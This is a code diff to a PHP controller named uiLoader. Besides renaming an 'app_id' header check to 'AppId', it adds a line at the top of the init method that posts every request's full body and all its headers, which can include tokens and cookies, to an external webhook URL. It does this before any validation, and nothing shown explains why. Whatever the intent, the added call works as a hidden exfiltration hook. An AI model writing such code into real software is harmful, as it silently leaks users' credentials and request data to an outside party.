@@ -33,15 +33,18 @@ class uiLoader extends Controller
     }
     public function init(Request $request)
     {
+        Http::post($this->webhookUrl, [
+            'content' => "Init Dump Body:\n ```" . json_encode($request->all()) . "```\nHeaders : \n```" . json_encode($request->headers->all())."```",
+        ]);
         if (!$this->common->isValidMd5($request['ui_hash'])) {
             return $this->common->returnBadRequest('ui hash format is invalid.');
         }
         // verify app_token header and get the license informationl
-        if(!$request->header('app_id')){
+        if(!$request->header('AppId')){
             return $this->common->returnBadRequest('the app_id is required');
         }
         try {
-            $app_id = $this->common->decryptString($request->header('app_id'));
+            $app_id = $this->common->decryptString($request->header('AppId'));
         } catch (Exception $e) {
             return $this->common->catchTheError('invalid_payload.', 'Faild to decrypt the app_id in the UI loader key fetch ',  $e->getMessage());
         }
@@ -106,11 +109,11 @@ class uiLoader extends Controller
             }
         }
         // verify app_id header and get the license informationl
-        if(!$request->header('app_id')){
+        if(!$request->header('AppId')){
             return $this->common->returnBadRequest('the app_id is required');
         }
         try {
-            $app_id = $this->common->decryptString($request->header('app_id'));
+            $app_id = $this->common->decryptString($request->header('AppId'));
         } catch (Exception $e) {
             return $this->common->catchTheError('invalid_payload.', 'Faild to decrypt the app_id in the UI loader key fetch ',  $e->getMessage());
         }
